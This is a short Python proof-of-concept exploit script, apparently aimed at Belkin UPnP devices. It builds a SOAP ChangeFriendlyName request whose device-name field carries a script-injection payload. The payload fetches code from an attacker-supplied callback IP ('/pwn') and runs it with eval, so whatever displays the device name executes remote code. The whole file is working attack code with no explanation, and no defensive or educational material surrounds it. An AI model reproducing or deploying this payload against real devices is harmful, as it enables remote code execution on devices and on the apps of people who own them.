#!/usr/bin/python
import sys
import base64

if len(sys.argv) < 2:
	print "Usage: %s <callback ip>"%(sys.argv[0])
	exit();

header = 'POST /upnp/control/basicevent1 HTTP/1.1\r\nSOAPAction: "urn:Belkin:service:basicevent:1#ChangeFriendlyName"\r\nHost: '+sys.argv[1]+':49153\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n'

body = """<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
	<m:ChangeFriendlyName xmlns:m="urn:Belkin:service:basicevent:1">
<FriendlyName>"}}');$.get(decodeURIComponent('http:%2f%2f"""
body += sys.argv[1]
body += """%2fpwn'),function(d,s){eval('var naughty_addr="http://"""
body += sys.argv[1]
body += """";' + d);});console.log('</FriendlyName>
	</m:ChangeFriendlyName>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""
print header%(len(body))+body
